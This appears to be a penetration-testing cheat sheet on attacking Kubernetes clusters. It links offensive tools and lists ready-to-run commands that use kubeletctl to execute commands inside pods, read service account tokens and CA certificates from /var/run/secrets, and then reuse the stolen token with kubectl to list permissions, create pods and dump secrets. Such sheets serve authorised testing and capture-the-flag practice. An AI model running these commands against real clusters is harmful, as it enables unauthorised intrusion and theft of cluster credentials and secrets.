# Kubernetes

## Tools

{% embed url="https://github.com/Rolix44/Kubestroyer" %}

{% embed url="https://github.com/stealthcopter/deepce" %}

## Enumeration

<table><thead><tr><th width="322">Info</th><th>Command</th></tr></thead><tbody><tr><td>Connect to API</td><td><code>curl https://$ip:8443/ -k</code></td></tr><tr><td>Connect to Kubelet service</td><td><code>curl https://$ip:10250/pods -k</code></td></tr><tr><td>Use kubeletctl to obtain all of the pods</td><td><code>kubeletctl --server $ip pods</code></td></tr><tr><td>Check command execution on pods</td><td><code>kubeletctl --server $ip scan rce</code></td></tr><tr><td>Execute command on pod</td><td><code>kubeletctl --server $ip exec "id" -p nginx -c nginx</code></td></tr><tr><td>Get token</td><td><code>kubeletctl --server $ip exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx</code></td></tr><tr><td>Get certificate and save to ca.crt</td><td><code>kubeletctl --server $ip exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx</code></td></tr><tr><td>Export token so it can be used</td><td><code>export token="eyJhb...."</code></td></tr><tr><td>Get a list of pods</td><td><code>kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 get pods</code></td></tr><tr><td>List default service account rights</td><td><code>kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 auth can-i --list</code></td></tr><tr><td>Create new pod</td><td><code>kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 apply -f f.yaml</code></td></tr><tr><td>Verify new pod created</td><td><code>kubectl --token=$token --certificate-authority=ca.crt --server=https://$ip:8443 get pods</code></td></tr></tbody></table>

## General

<table><thead><tr><th width="374">Info</th><th width="472">Command</th></tr></thead><tbody><tr><td>Check permissions</td><td><code>kubectl auth can-i --list</code></td></tr><tr><td>Check permissions with token</td><td><code>./kubectl auth can-i --list --token=${TOKEN}</code></td></tr><tr><td>Get secrets</td><td><code>kubectl get secrets</code></td></tr><tr><td>List the content of a secret</td><td><code>kubectl describe secret secretflag</code></td></tr><tr><td>Get the data content of a secret</td><td><code>kubectl get secret secretflag -o 'json'</code></td></tr><tr><td>Token of a service account is stored in</td><td><code>/var/run/secrets/kubernetes.io/serviceaccount/token</code></td></tr><tr><td>Get pods with the token</td><td><code>./kubectl get pods --token=${TOKEN}</code></td></tr></tbody></table>
